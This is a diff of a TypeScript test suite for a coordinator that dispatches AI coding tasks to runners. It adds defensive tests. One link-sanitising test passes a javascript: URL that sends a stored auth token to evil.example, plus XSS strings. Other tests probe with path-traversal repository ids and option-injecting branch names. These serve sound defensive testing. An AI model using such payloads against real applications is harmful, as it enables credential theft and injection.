@@ -36,9 +36,6 @@ import { startWebServer, closeWebServer } from '../../src/web/server.js';
 import { makeTempDir } from '../e2e/harness/index.js';
 
 describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runner Swarm', () => {
-  /* ==================================================================== */
-  /* 1. Explicit Model Selection & Pool-Targeted Quota Math               */
-  /* ==================================================================== */
   describe('1. Explicit Model Selection & Pool-Targeted Quota Math', () => {
     it('resolves explicit model IDs and pool group shorthands without magic auto-routing', () => {
       assert.equal(resolveConcreteModelId(undefined, 'gemini-4-argon'), 'gemini-4-argon');
@@ -191,9 +188,6 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
     });
   });
 
-  /* ==================================================================== */
-  /* 2. SQLite Task Queue Routing & Lease Reaping                         */
-  /* ==================================================================== */
   describe('2. SQLite Task Queue Routing & Lease Reaping', () => {
     it('enqueues and claims tasks in FIFO order and updates status cleanly', () => {
       const { dir, cleanup } = makeTempDir('orch_queue_');
@@ -317,6 +311,51 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
       }
     });
 
+    it('refuses to push a claimed or executing task back to queued or claimed through a runner report', () => {
+      const { dir, cleanup } = makeTempDir('orch_no_pushback_');
+      const db = new AppDatabase(path.join(dir, 'test.db'));
+
+      try {
+        const queue = new TaskQueue(db);
+        const task = queue.enqueue({
+          repositoryId: 'agylity',
+          repositoryName: 'agylity',
+          prompt: 'Pushback target',
+          scheduleMode: 'immediate',
+          cascade: [{ model: 'gemini-4-hydrogen', effort: 'high' }],
+        });
+
+        const claimed = queue.claimNext({ runnerId: 'runner-1' });
+        assert.equal(claimed?.id, task.id);
+        assert.equal(claimed?.status, 'claimed');
+
+        // A runner may not demote its own claimed task back to queued...
+        const demoted = queue.updateTaskStatus(task.id, { status: 'queued', runnerId: 'runner-1' });
+        assert.equal(demoted?.applied, false);
+        assert.equal(queue.getTask(task.id)?.status, 'claimed');
+
+        // ...nor re-claim it while staking its runner id.
+        const reclaimed = queue.updateTaskStatus(task.id, {
+          status: 'claimed',
+          runnerId: 'runner-1',
+        });
+        assert.equal(reclaimed?.applied, false);
+        assert.equal(queue.getTask(task.id)?.status, 'claimed');
+
+        // The same runner can still settle the task for real.
+        const settled = queue.updateTaskStatus(task.id, {
+          status: 'completed',
+          runnerId: 'runner-1',
+          durationMs: 500,
+        });
+        assert.equal(settled?.applied, true);
+        assert.equal(queue.getTask(task.id)?.status, 'completed');
+      } finally {
+        db.close();
+        cleanup();
+      }
+    });
+
     it('keeps the stored identity of an unrestricted registered runner across a claim', () => {
       const { dir, cleanup } = makeTempDir('orch_runner_identity_');
       const db = new AppDatabase(path.join(dir, 'test.db'));
@@ -368,7 +407,153 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
       }
     });
 
-    it('searches title, repository and origin title only, and treats % as a literal', () => {
+    it('drops a link a runner could not have opened', () => {
+      const { dir, cleanup } = makeTempDir('orch_link_scheme_');
+      const db = new AppDatabase(path.join(dir, 'test.db'));
+
+      try {
+        const queue = new TaskQueue(db);
+        const task = queue.enqueue({
+          repositoryName: 'agylity',
+          prompt: 'report links',
+          cascade: [{ model: 'gemini-4-argon', effort: 'high' }],
+        });
+        queue.claimNext({ runnerId: 'runner-1', runnerName: 'r', labels: [], repositories: [] });
+
+        queue.updateTaskStatus(task.id, {
+          status: 'completed',
+          runnerId: 'runner-1',
+          prUrl: 'javascript:fetch("//evil.example/" + localStorage.agylity_auth_token)',
+          issueUrls: [
+            'javascript:alert(document.domain)',
+            'data:text/html,<script>alert(1)</script>',
+            'https://github.com/OtterBoops/agylity/issues/1',
+          ],
+        });
+
+        const stored = queue.getTask(task.id);
+        assert.equal(stored?.prUrl, undefined);
+        assert.deepEqual(stored?.issueUrls, ['https://github.com/OtterBoops/agylity/issues/1']);
+
+        // A real PR link still lands.
+        const second = queue.enqueue({
+          repositoryName: 'agylity',
+          prompt: 'report a real link',
+          cascade: [{ model: 'gemini-4-argon', effort: 'high' }],
+        });
+        queue.claimNext({ runnerId: 'runner-2', runnerName: 'r', labels: [], repositories: [] });
+        queue.updateTaskStatus(second.id, {
+          status: 'completed',
+          runnerId: 'runner-2',
+          prUrl: 'https://github.com/OtterBoops/agylity/pull/7',
+        });
+        assert.equal(
+          queue.getTask(second.id)?.prUrl,
+          'https://github.com/OtterBoops/agylity/pull/7'
+        );
+      } finally {
+        db.close();
+        cleanup();
+      }
+    });
+
+    it('bounds the attempt bookkeeping no matter what a caller writes', () => {
+      const { dir, cleanup } = makeTempDir('orch_attempt_bounds_');
+      const db = new AppDatabase(path.join(dir, 'test.db'));
+
+      try {
+        const queue = new TaskQueue(db);
+        const row = queue.createBacklogTask({
+          title: 'Bounds',
+          prompt: 'P',
+          repositoryId: 'agylity',
+          maxAttempts: -1,
+        });
+        assert.equal(row.maxAttempts, 1, 'an item always allows at least one attempt');
+
+        for (const patch of [
+          { attemptCount: -5 },
+          { attemptCount: Number.NaN },
+          { attemptCount: Number.POSITIVE_INFINITY },
+          { maxAttempts: 0 },
+          { maxAttempts: -3 },
+          { attemptCount: 2.7 },
+        ]) {
+          const updated = queue.updateBacklogTask(row.id, patch as any);
+          assert.ok(updated);
+          assert.ok(
+            updated.attemptCount >= 0,
+            `${JSON.stringify(patch)} left ${updated.attemptCount}`
+          );
+          assert.ok(Number.isInteger(updated.attemptCount), 'attempts are whole');
+          assert.ok(
+            updated.maxAttempts >= 1,
+            `${JSON.stringify(patch)} left ${updated.maxAttempts}`
+          );
+        }
+      } finally {
+        db.close();
+        cleanup();
+      }
+    });
+
+    it('holds its status-transition invariants across every from/to/runner combination', () => {
+      const { dir, cleanup } = makeTempDir('orch_status_matrix_');
+      const db = new AppDatabase(path.join(dir, 'test.db'));
+
+      try {
+        const queue = new TaskQueue(db);
+        const statuses = [
+          'queued',
+          'claimed',
+          'executing',
+          'completed',
+          'failed',
+          'aborted',
+          'no_changes',
+        ] as const;
+        const terminal = new Set(['completed', 'failed', 'aborted', 'no_changes']);
+
+        const rowIn = (status: string): string => {
+          const task = queue.enqueue({
+            repositoryName: 'agylity',
+            prompt: `row ${status}`,
+            cascade: [{ model: 'gemini-4-argon', effort: 'high' }],
+          });
+          if (status !== 'queued') {
+            db.getRawDb()
+              .prepare('UPDATE swarm_tasks SET status = ?, runner_id = ? WHERE id = ?')
+              .run(status, 'runner-own', task.id);
+          }
+          return task.id;
+        };
+
+        for (const from of statuses) {
+          for (const to of statuses) {
+            for (const runnerId of [undefined, 'runner-own', 'runner-other']) {
+              const id = rowIn(from);
+              const before = queue.getTask(id)!.status;
+              const result = queue.updateTaskStatus(id, { status: to, runnerId });
+              const after = queue.getTask(id)!.status;
+              const applied = Boolean(result?.applied);
+
+              if (!applied) {
+                assert.equal(after, before, `${from}->${to} (${runnerId}) was refused but changed`);
+                continue;
+              }
+              assert.equal(after, to, `${from}->${to} (${runnerId}) reported applied`);
+              assert.equal(terminal.has(from), false, `${from} is terminal and must not move`);
+              assert.notEqual(runnerId, 'runner-other', 'a foreign runner must be refused');
+            }
+          }
+        }
+      } finally {
+        db.close();
+        cleanup();
+      }
+    });
+
+    it('searches title, repository, origin title and model, and treats % as a literal', () => {
       const { dir, cleanup } = makeTempDir('orch_list_search_');
       const db = new AppDatabase(path.join(dir, 'test.db'));
 
@@ -394,6 +579,12 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
           originTitle: 'Issue about zebras',
           cascade: [{ model: 'gemini-4-argon', effort: 'high' }],
         });
+        const modelRow = queue.enqueue({
+          repositoryName: 'agylity',
+          title: 'Model swap',
+          prompt: 'retry with another model',
+          cascade: [{ model: 'claude-opus-5-5', effort: 'high' }],
+        });
 
         // Title match. The second row carries the term in its prompt and must not surface.
         const byTitle = queue.listTasks({ q: 'quarterly' });
@@ -407,6 +598,12 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
         assert.deepEqual(
           queue.listTasks({ q: 'NEBULA' }).map((t) => t.title),
           ['Chart cleanup']
+        );
+
+        // The model is searchable, which is what the dashboard filter advertises.
+        assert.deepEqual(
+          queue.listTasks({ q: 'opus' }).map((t) => t.id),
+          [modelRow.id]
         );
 
         // Origin title is searchable; the prompt is not.
@@ -433,7 +630,7 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
         );
         assert.equal(queue.countTasks({ taskNumber: migrated.taskNumber }), 1);
         // A non-finite number is ignored rather than coerced to a task_number of 0.
-        assert.equal(queue.listTasks({ taskNumber: Number.NaN }).length, 3);
+        assert.equal(queue.listTasks({ taskNumber: Number.NaN }).length, 4);
       } finally {
         db.close();
         cleanup();
@@ -559,9 +756,6 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
     });
   });
 
-  /* ==================================================================== */
-  /* 3. Git Branch Isolation & Official agy CLI TaskExecutor              */
-  /* ==================================================================== */
   describe('2b. Pruning keeps the proof a backlog origin settled', () => {
     it('does not prune a terminal task whose backlog origin is still dispatched', () => {
       const { dir, cleanup } = makeTempDir('orch_prune_origin_');
@@ -630,6 +824,14 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
             if (file === 'git' && args[0] === 'status') {
               return { stdout: ' M src/index.ts\n', stderr: '' };
             }
+            if (
+              file === 'git' &&
+              args[0] === 'diff' &&
+              args[1] === '--cached' &&
+              args[2] === '--quiet'
+            ) {
+              throw Object.assign(new Error('staged changes'), { code: 1 });
+            }
             return { stdout: 'Task completed cleanly', stderr: '' };
           },
         });
@@ -674,6 +876,8 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
           'gemini-4-argon',
           '--effort',
           'high',
+          '--output-format',
+          'stream-json',
         ]);
 
         // 3. Subsequent commands stage, commit, and push the isolated branch
@@ -708,6 +912,98 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
         const res = await executor.execute(task);
         assert.equal(res.success, false);
         assert.ok(res.error?.includes('Branch isolation invariant violation'));
+      } finally {
+        db.close();
+        cleanup();
+      }
+    });
+
+    it('refuses a repository id that would run outside the repos root', async () => {
+      const { dir, cleanup } = makeTempDir('orch_repo_id_traversal_');
+      const db = new AppDatabase(path.join(dir, 'test.db'));
+
+      try {
+        const configStore = new ConfigStore(db, {
+          coordinatorEnabled: true,
+          repositories: [
+            { id: 'agylity', name: 'agylity', path: path.join(dir, 'repo'), defaultBranch: 'main' },
+          ],
+        });
+        const coordinator = new Coordinator({ configStore });
+        coordinator.onQuotaUpdated([
+          {
+            poolId: 'gemini',
+            poolGroup: 'gemini',
+            displayName: 'Gemini Flash',
+            remainingFraction: 0.8,
+            resetTime: new Date(Date.now() + 3600000).toISOString(),
+            hoursUntilReset: 1,
+            models: ['gemini-4-hydrogen'],
+          },
+        ]);
+
+        for (const repositoryId of ['../../etc', '..', '/etc', '.hidden', 'a/b', 'a\\b']) {
+          const res = await coordinator.dispatch({
+            repositoryId,
+            prompt: 'probe',
+            requestedBy: 'probe',
+            cascade: [{ model: 'gemini-4-hydrogen', effort: 'medium' }],
+          });
+          assert.equal(res.success, false, `accepted ${repositoryId}`);
+          assert.match(String(res.error), /must be a configured repository or a plain slug/);
+        }
+
+        // A configured repository, a plain slug, and an id the sanitiser can fold still dispatch.
+        for (const repositoryId of ['agylity', 'not-configured-yet', 'my:repo@v1']) {
+          const res = await coordinator.dispatch({
+            repositoryId,
+            prompt: 'probe',
+            requestedBy: 'probe',
+            cascade: [{ model: 'gemini-4-hydrogen', effort: 'medium' }],
+          });
+          assert.equal(res.success, true, `${repositoryId}: ${res.error}`);
+        }
+      } finally {
+        db.close();
+        cleanup();
+      }
+    });
+
+    it('refuses a stored branch name that is not a usable ref, before it spends the run', async () => {
+      const { dir, cleanup } = makeTempDir('orch_branch_ref_guard_');
+      const db = new AppDatabase(path.join(dir, 'test.db'));
+
+      try {
+        const queue = new TaskQueue(db);
+        const executor = new TaskExecutor({
+          dirExistsFn: () => true,
+          execFileFn: async () => {
+            throw new Error('no git command may run for an unusable branch');
+          },
+        });
+
+        for (const branchName of [
+          '--force',
+          '-B',
+          'agy/x y',
+          'agy/../escape',
+          'agy/x.lock',
+          'agy/x@{1}',
+          'agy//x',
+          'agy/x/',
+        ]) {
+          const task = queue.enqueue({
+            repositoryName: 'agylity',
+            repositoryPath: dir,
+            prompt: 'Attempt a bogus branch',
+            cascade: [{ model: 'gemini-4-argon', effort: 'high' }],
+          });
+          task.branchName = branchName;
+
+          const res = await executor.execute(task);
+          assert.equal(res.success, false, `accepted ${JSON.stringify(branchName)}`);
+          assert.match(String(res.error), /not a usable git branch name/, branchName);
+        }
       } finally {
         db.close();
         cleanup();
@@ -857,9 +1153,6 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
     });
   });
 
-  /* ==================================================================== */
-  /* 4. Outbound Long-Poll Swarm API & GitHub-Runner Registration Flow    */
-  /* ==================================================================== */
   describe('4. Outbound Long-Poll Swarm API & GitHub-Runner Registration Flow', () => {
     it('supports fallback shared-secret long-polling, token auth, and status callbacks', async () => {
       const { dir, cleanup } = makeTempDir('orch_web_swarm_');
@@ -948,6 +1241,14 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
             if (file === 'agy') executedTasks.push(file);
             if (file === 'git' && args[0] === 'status') {
               return { stdout: ' M src/index.ts\n', stderr: '' };
+            }
+            if (
+              file === 'git' &&
+              args[0] === 'diff' &&
+              args[1] === '--cached' &&
+              args[2] === '--quiet'
+            ) {
+              throw Object.assign(new Error('staged changes'), { code: 1 });
             }
             return { stdout: '', stderr: '' };
           },
@@ -1295,9 +1596,6 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
     });
   });
 
-  /* ==================================================================== */
-  /* 5. Discord Modal Model/Priority Parsing & Pool Alert Inheritance     */
-  /* ==================================================================== */
   describe('5. Discord Modal Shape & Pool Alert Inheritance', () => {
     it('builds a Components V2 modal whose model and effort are selects scoped to the pool', () => {
       const selectRow = createRepoSelectMenu(
@@ -1338,9 +1636,6 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
     });
   });
 
-  /* ==================================================================== */
-  /* 6. Strict Single-User Binding (Explicit Owner & TOFU Pinning)        */
-  /* ==================================================================== */
   describe('6. Strict Single-User Binding (Explicit Owner & TOFU Pinning)', () => {
     it('parses DISCORD_OWNER_USER_ID from environment and resolves in ConfigStore', () => {
       const parsed = parseRawEnv({ DISCORD_OWNER_USER_ID: '  998877665544332211  ' });
@@ -1559,9 +1854,6 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
     });
   });
 
-  /* ==================================================================== */
-  /* 7. CLI JSON Preamble Extraction & Dynamic Config Updates             */
-  /* ==================================================================== */
   describe('7. CLI JSON Preamble Extraction & Dynamic Config Updates', () => {
     it('extractCliJsonPayload parses agy --output-format json models output with leading status line', async () => {
       const realAgyStdout = `Fetching available models...\n{\n  "conversation_id": null,\n  "status": "completed",\n  "command": {\n    "name": "models",\n    "data": {\n      "models": [\n        { "id": "gemini-4-argon-high", "label": "Gemini 4 Argon (High)" },\n        { "id": "claude-sonnet-5-5", "label": "Claude Sonnet 5.5" }\n      ]\n    }\n  }\n}\n`;
@@ -1690,11 +1982,30 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
       const task = await worker.pollOnce();
       assert.equal(task, null);
     });
+
+    it('stops respawning the auth probe when it fails for a non-auth reason', async () => {
+      let execCalls = 0;
+      const worker = new RemoteSwarmRunner({
+        coordinatorUrl: 'http://127.0.0.1:8484',
+        runnerId: 'guard-test-worker',
+        execFileFn: async () => {
+          execCalls++;
+          throw new Error('spawn agy ENOENT');
+        },
+      });
+
+      for (let i = 0; i < 5; i++) {
+        assert.equal(
+          await worker.checkAuthPreClaim(),
+          true,
+          'a broken probe must not block polling'
+        );
+      }
+
+      assert.equal(execCalls, 1, 'a failed probe is retried on a slow cadence, not every poll');
+    });
   });
 
-  /* ==================================================================== */
-  /* 8. Dispatch Policy Resolution, Telemetry Failsafe & Repo Id Sanitise  */
-  /* ==================================================================== */
   describe('8. Dispatch Policy Resolution, Telemetry Failsafe & Repo Id Sanitise', () => {
     it('derives the per-pool policy from the resolved model, not raw substring matching', () => {
       const { dir, cleanup } = makeTempDir('coord_policy_');
@@ -1912,9 +2223,6 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
     });
   });
 
-  /* ==================================================================== */
-  /* 9. Task Queue Ownership Guards, Lease Reaping & Schema Migration     */
-  /* ==================================================================== */
   describe('9. Task Queue Ownership Guards, Lease Reaping & Schema Migration', () => {
     it('will not let a poll payload widen a registered worker scope', () => {
       const { dir, cleanup } = makeTempDir('orch_scope_');
@@ -3258,6 +3566,134 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
       }
     });
 
+    it('refuses to dispatch a routine whose model maps to no pool instead of failing open to gemini', async () => {
+      const { dir, cleanup } = makeTempDir('orch_routine_unmapped_');
+      const db = new AppDatabase(path.join(dir, 'test.db'));
+      try {
+        const configStore = new ConfigStore(db, {
+          coordinatorEnabled: true,
+          defaultDispatchModel: 'claude-sonnet-5-5',
+          poolGroupPolicies: {
+            claude: { alertsEnabled: true, dispatchEnabled: true },
+            gemini: { alertsEnabled: true, dispatchEnabled: true },
+          },
+          repositories: [{ id: 'agylity', name: 'agylity', path: dir, defaultBranch: 'main' }],
+        });
+        const coordinator = new Coordinator({ configStore });
+
+        const unmapped = coordinator.queue.createRoutineTask({
+          title: 'Unmapped model',
+          prompt: 'Sweep the repo',
+          repositoryId: 'agylity',
+          cascade: [{ model: 'quantum-9-turbo', effort: 'high' }],
+          triggerBeforeResetHours: 12,
+        });
+        const mapped = coordinator.queue.createRoutineTask({
+          title: 'Mapped model',
+          prompt: 'Sweep the repo',
+          repositoryId: 'agylity',
+          cascade: [{ model: 'gemini-4-hydrogen', effort: 'medium' }],
+          triggerBeforeResetHours: 12,
+        });
+
+        const snapshots: QuotaSnapshot[] = [
+          {
+            poolId: 'gemini',
+            poolGroup: 'gemini',
+            displayName: 'Gemini 4 Argon',
+            remainingFraction: 0.9,
+            resetTime: new Date(Date.now() + 5 * 3600_000).toISOString(),
+            hoursUntilReset: 5,
+            models: ['Gemini 4 Argon'],
+          },
+        ];
+
+        assert.equal(
+          coordinator.computeRoutineEligibility(unmapped, snapshots).state,
+          'pool_disabled'
+        );
+        assert.equal(coordinator.computeRoutineEligibility(mapped, snapshots).state, 'ready');
+
+        const spawned = await coordinator.triggerEligibleRoutines(snapshots);
+        assert.equal(spawned.length, 1);
+        assert.equal(spawned[0]!.originId, mapped.id);
+        assert.equal(coordinator.computeRoutineEligibility(mapped, snapshots).state, 'running');
+      } finally {
+        db.close();
+        cleanup();
+      }
+    });
+
+    it('reads the latest run of the pool a routine cycle is evaluating, not any pool', async () => {
+      const { dir, cleanup } = makeTempDir('orch_routine_pool_key_');
+      const db = new AppDatabase(path.join(dir, 'test.db'));
+      try {
+        const configStore = new ConfigStore(db, {
+          coordinatorEnabled: true,
+          defaultDispatchModel: 'claude-sonnet-5-5',
+          poolGroupPolicies: {
+            claude: { alertsEnabled: true, dispatchEnabled: true },
+            gemini: { alertsEnabled: true, dispatchEnabled: true },
+          },
+          repositories: [{ id: 'agylity', name: 'agylity', path: dir, defaultBranch: 'main' }],
+        });
+        const coordinator = new Coordinator({ configStore });
+
+        coordinator.queue.createRoutineTask({
+          title: 'Multi-pool routine',
+          prompt: 'Sweep the repo',
+          repositoryId: 'agylity',
+          cascade: [
+            { model: 'claude-sonnet-5-5', effort: 'high' },
+            { model: 'gemini-4-hydrogen', effort: 'medium' },
+          ],
+          triggerBeforeResetHours: 12,
+        });
+
+        const claudeReset = '2026-11-08T01:30:44Z';
+        const geminiReset = '2026-11-09T01:30:44Z';
+        const claudePool = (hoursUntilReset: number): QuotaSnapshot => ({
+          poolId: 'claude:claude-sonnet-5-5',
+          poolGroup: 'claude',
+          displayName: 'Claude (suffixed pool id)',
+          remainingFraction: 0.9,
+          resetTime: claudeReset,
+          hoursUntilReset,
+          models: ['Claude Sonnet 5.5'],
+        });
+        const geminiPool = (hoursUntilReset: number): QuotaSnapshot => ({
+          poolId: 'gemini',
+          poolGroup: 'gemini',
+          displayName: 'Gemini 4 Argon',
+          remainingFraction: 0.9,
+          resetTime: geminiReset,
+          hoursUntilReset,
+          models: ['Gemini 4 Argon'],
+        });
+
+        // 1. Claude's cycle fires and its run fails: the claude cycle is burned.
+        const first = await coordinator.triggerEligibleRoutines([claudePool(5), geminiPool(48)]);
+        assert.equal(first.length, 1);
+        assert.equal(first[0]!.model, 'claude-sonnet-5-5');
+        await coordinator.reportTaskStatus(first[0]!.id, { status: 'failed', error: 'boom' });
+
+        // 2. Gemini fires in its own cycle and completes.
+        const second = await coordinator.triggerEligibleRoutines([claudePool(48), geminiPool(5)]);
+        assert.equal(second.length, 1);
+        assert.equal(second[0]!.model, 'gemini-4-hydrogen');
+        await coordinator.reportTaskStatus(second[0]!.id, { status: 'completed', durationMs: 10 });
+
+        // 3. Claude's cycle comes back around inside the same reset: it must stay burned because
+        //    claude's own run failed. The completed gemini run belongs to another pool and must
+        //    not re-arm claude's cycle.
+        const third = await coordinator.triggerEligibleRoutines([claudePool(5), geminiPool(48)]);
+        assert.equal(third.length, 0);
+      } finally {
+        db.close();
+        cleanup();
+      }
+    });
+
     it('loops a routine sequentially inside one reset cycle after the previous run completed', async () => {
       const { dir, cleanup } = makeTempDir('orch_routine_loop_');
       const db = new AppDatabase(path.join(dir, 'test.db'));
@@ -3971,9 +4407,6 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
     });
   });
 
-  /* ==================================================================== */
-  /* 12. Flat Disclosure Footer & Autonomous PR Governance Policy          */
-  /* ==================================================================== */
   describe('12. Flat Disclosure Footer & Autonomous PR Governance Policy', () => {
     it('always appends flat disclosure footer without agylity[bot] commit authorship', async () => {
       const { dir, cleanup } = makeTempDir('orch_flat_disclosure_');
@@ -4004,6 +4437,14 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
             }
             if (file === 'git' && args[0] === 'status') {
               return { stdout: ' M src/auth.ts\n', stderr: '' };
+            }
+            if (
+              file === 'git' &&
+              args[0] === 'diff' &&
+              args[1] === '--cached' &&
+              args[2] === '--quiet'
+            ) {
+              throw Object.assign(new Error('staged changes'), { code: 1 });
             }
             if (file === 'git' && args[0] === 'commit') {
               capturedCommitEnv = opts?.env as Record<string, string | undefined>;
@@ -4076,6 +4517,9 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
               if (args[0] === 'status') {
                 return { stdout: ' M src/auth.ts\n', stderr: '' };
               }
+              if (args[0] === 'diff' && args[1] === '--cached' && args[2] === '--quiet') {
+                throw Object.assign(new Error('staged changes'), { code: 1 });
+              }
               if (args[0] === 'diff' && args.includes('--name-only')) {
                 return { stdout: 'src/auth.ts\n', stderr: '' };
               }
@@ -4126,6 +4570,9 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
               gitInvocations.push(args as string[]);
               if (args[0] === 'status') {
                 return { stdout: ' M docs/guide.md\n', stderr: '' };
+              }
+              if (args[0] === 'diff' && args[1] === '--cached' && args[2] === '--quiet') {
+                throw Object.assign(new Error('staged changes'), { code: 1 });
               }
               if (args[0] === 'diff' && args.includes('--name-only')) {
                 return { stdout: 'docs/guide.md\n', stderr: '' };
@@ -4189,6 +4636,9 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
                 if (args[0] === 'status') {
                   return { stdout: row.dirty, stderr: '' };
                 }
+                if (args[0] === 'diff' && args[1] === '--cached' && args[2] === '--quiet') {
+                  throw Object.assign(new Error('staged changes'), { code: 1 });
+                }
               }
               return { stdout: 'done', stderr: '' };
             },
@@ -4251,9 +4701,6 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
     });
   });
 
-  /* ==================================================================== */
-  /* 13. Retry Origin Sync, Blank-Patch Fallback & Early-Reset Recovery   */
-  /* ==================================================================== */
   describe('13. Retry Origin Sync, Blank-Patch Fallback & Early-Reset Recovery', () => {
     const freshFlashPools = (
       resetTime = new Date(Date.now() + 6 * 3600 * 1000).toISOString()
@@ -4675,9 +5122,6 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
     });
   });
 
-  /* ==================================================================== */
-  /* 14. Backlog Tier Gating, Immediate Claimability & Unclaimed Expiry    */
-  /* ==================================================================== */
   describe('14. Backlog tier gating, immediate claimability & unclaimed expiry', () => {
     // 100h out is deliberately far outside any pre-reset burn window, so a spawn here can only be
     // the backlog tier's own path.
@@ -4911,6 +5355,162 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
       }
     });
 
+    it('never parks an exhausted backlog item back in pending where the scheduler cannot see it', async () => {
+      const { dir, cleanup } = makeTempDir('coord_backlog_exhausted_');
+      const db = new AppDatabase(path.join(dir, 'test.db'));
+
+      try {
+        const configStore = new ConfigStore(db, backlogConfig(dir));
+        const coordinator = new Coordinator({ configStore });
+        coordinator.onQuotaUpdated(hydrogenPools(0.8));
+        const pastIso = new Date(Date.now() - 60_000).toISOString();
+        const settledRow = (id: string) => {
+          const row = coordinator.queue.getBacklogTask(id)!;
+          assert.ok(
+            !(row.status === 'pending' && row.attemptCount >= row.maxAttempts),
+            `${row.title} is parked pending at ${row.attemptCount}/${row.maxAttempts}`
+          );
+          return row;
+        };
+
+        // A spent origin must refuse the retry instead of spawning past its budget.
+        const spent = createOrigin(coordinator, 'Spent backlog item', 1);
+        coordinator.queue.updateBacklogTask(spent.id, { status: 'failed', attemptCount: 2 });
+        assert.equal(coordinator.queue.getBacklogTask(spent.id)?.maxAttempts, 2);
+
+        const refused = await coordinator.dispatch({
+          repositoryId: 'agylity',
+          prompt: 'Retry the spent item',
+          title: spent.title,
+          tier: 'backlog',
+          originId: spent.id,
+          cascade: [{ model: 'gemini-4-hydrogen', effort: 'medium' }],
+          scheduleMode: 'immediate',
+        });
+        assert.equal(refused.success, false);
+        assert.equal(refused.code, 'ORIGIN_NOT_DISPATCHABLE');
+        const stillSpent = settledRow(spent.id);
+        assert.equal(stillSpent.status, 'failed');
+        assert.equal(stillSpent.attemptCount, 2);
+        assert.equal(coordinator.queue.getNextEligibleBacklogTask(), undefined);
+
+        // A run stacked behind the last attempt expires unclaimed: terminal, not pending-at-the-cap.
+        const stackedOrigin = createOrigin(coordinator, 'Stacked backlog item', 2);
+        coordinator.queue.updateBacklogTask(stackedOrigin.id, {
+          status: 'dispatched',
+          attemptCount: 2,
+        });
+        const stacked = await coordinator.dispatch({
+          repositoryId: 'agylity',
+          prompt: 'Stack behind the last attempt',
+          title: stackedOrigin.title,
+          tier: 'backlog',
+          originId: stackedOrigin.id,
+          cascade: [{ model: 'gemini-4-hydrogen', effort: 'medium' }],
+          scheduleMode: 'immediate',
+        });
+        assert.equal(stacked.success, true);
+        assert.equal(coordinator.queue.getBacklogTask(stackedOrigin.id)?.attemptCount, 2);
+
+        db.getRawDb()
+          .prepare('UPDATE swarm_tasks SET expires_at = ? WHERE id = ?')
+          .run(pastIso, stacked.taskId!);
+        const reaped = coordinator.queue.reapExpiredQueuedTasks(Date.now());
+        assert.deepEqual(
+          reaped.map((task) => task.id),
+          [stacked.taskId]
+        );
+
+        const settled = settledRow(stackedOrigin.id);
+        assert.equal(settled.status, 'failed');
+        assert.equal(settled.attemptCount, 2);
+        assert.equal(settled.swarmTaskId, undefined);
+        assert.match(settled.lastError ?? '', /queue window/);
+
+        // A stacked run cancelled at the cap must settle terminal too, not pending-at-the-cap.
+        const cancelledOrigin = createOrigin(coordinator, 'Cancelled stacked item', 3);
+        const firstRun = await coordinator.dispatch({
+          repositoryId: 'agylity',
+          prompt: 'First attempt of the cancelled item',
+          title: cancelledOrigin.title,
+          tier: 'backlog',
+          originId: cancelledOrigin.id,
+          cascade: [{ model: 'gemini-4-hydrogen', effort: 'medium' }],
+          scheduleMode: 'immediate',
+        });
+        assert.equal(firstRun.success, true);
+        const firstClaim = await coordinator.pollForTask({
+          runnerId: 'runner-cancel-1',
+          timeoutMs: 0,
+        });
+        assert.equal(firstClaim?.id, firstRun.taskId);
+        await coordinator.reportTaskStatus(firstRun.taskId!, {
+          status: 'failed',
+          runnerId: 'runner-cancel-1',
+          error: 'First attempt failed',
+        });
+        const afterFirst = settledRow(cancelledOrigin.id);
+        assert.equal(afterFirst.status, 'pending');
+        assert.equal(afterFirst.attemptCount, 1);
+
+        const secondRun = await coordinator.dispatch({
+          repositoryId: 'agylity',
+          prompt: 'Second attempt of the cancelled item',
+          title: cancelledOrigin.title,
+          tier: 'backlog',
+          originId: cancelledOrigin.id,
+          cascade: [{ model: 'gemini-4-hydrogen', effort: 'medium' }],
+          scheduleMode: 'immediate',
+        });
+        assert.equal(secondRun.success, true);
+        assert.equal(coordinator.queue.getBacklogTask(cancelledOrigin.id)?.attemptCount, 2);
+
+        const secondClaim = await coordinator.pollForTask({
+          runnerId: 'runner-cancel-2',
+          timeoutMs: 0,
+        });
+        assert.equal(secondClaim?.id, secondRun.taskId);
+
+        const thirdRun = await coordinator.dispatch({
+          repositoryId: 'agylity',
+          prompt: 'Stacked behind the second attempt',
+          title: cancelledOrigin.title,
+          tier: 'backlog',
+          originId: cancelledOrigin.id,
+          cascade: [{ model: 'gemini-4-hydrogen', effort: 'medium' }],
+          scheduleMode: 'immediate',
+        });
+        assert.equal(thirdRun.success, true);
+        assert.equal(coordinator.queue.getBacklogTask(cancelledOrigin.id)?.attemptCount, 2);
+
